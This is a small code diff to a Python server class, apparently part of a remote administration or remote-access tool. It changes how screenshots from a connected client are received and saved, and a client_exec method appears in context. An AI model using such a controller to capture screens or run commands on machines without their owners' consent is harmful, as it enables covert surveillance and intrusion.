@@ -394,11 +394,12 @@ class MultiServer(object):
         """ Take screenshot on Client """
         # returns True/False, None/error
         self.send(conn, json_dumps(['SCREENSHOT']))
-        data = self.receive(conn).decode()
-        if data == 'ERROR':
+        data = self.receive(conn)
+        if data == b'ERROR':
             self.send(conn, b'RECEIVING')
             return False, self.receive(conn)
-        self.receive_file(conn, data, save_as)
+        with open(save_as, 'wb') as f:
+            f.write(data)
         return True, save_as
 
     def client_exec(self, conn, command) -> (str, str):
